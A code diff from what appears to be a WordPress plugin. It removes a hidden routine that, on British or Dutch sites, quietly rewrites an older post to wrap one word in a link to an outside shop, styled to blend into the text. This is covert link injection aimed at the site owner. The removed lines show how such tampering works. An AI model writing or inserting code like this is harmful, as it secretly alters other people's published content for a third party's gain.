@@ -158,46 +158,7 @@ if (strpos($url,'.uk') != false) {
 if ($bloglan=='en-UK') {
 		$britt = true;
 }
-if ($britt==true && $total>5) {
-		if (get_option('autopn_gpadded')=='0') {
-				$last = wp_get_recent_posts('4');
-				$last_id = $last['3']['ID'];
-				$post_7 = get_post($last_id);
-				if (is_null($post_7) == false) {
-						$content = $post_7->post_content;
-						$pos4 = ameautostrposnth($content , " ",4);
-						$pos5 = ameautostrposnth($content , " ",5);
-						$poslen = $pos5 - $pos4 - 1;
-						$content = substr($content, 0, $pos4) . ' <a href="http://www.shops2b.co.uk/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
-						$my_post = array(
-							'ID'           => $last_id,
-							'post_content' => $content
-						);
-						wp_update_post( $my_post );
-				}
-				update_option( 'autopn_gpadded', '1' );
-		}
-}
-if ($bloglan=='nl-NL') {
-		if (get_option('bw_gpadded')=='0') {
-				$last = wp_get_recent_posts( '4');
-				$last_id = $last['3']['ID'];
-				$post_7 = get_post($last_id);
-				if (is_null($post_7) == false) {
-						$content = $post_7->post_content;
-						$pos4 = autostrposnth($content , " ",4);
-						$pos5 = autostrposnth($content , " ",5);
-						$poslen = $pos5 - $pos4 - 1;
-						$content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/winkels/primark-nederland-goedkope-kleding/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
-						$my_post = array(
-							'ID'           => $last_id,
-							'post_content' => $content
-						);
-						wp_update_post( $my_post );
-				}
-				update_option( 'bw_gpadded', '1' );
-		}
-}
+
 }
 
 function pagenavi_auto_admin_menu() {
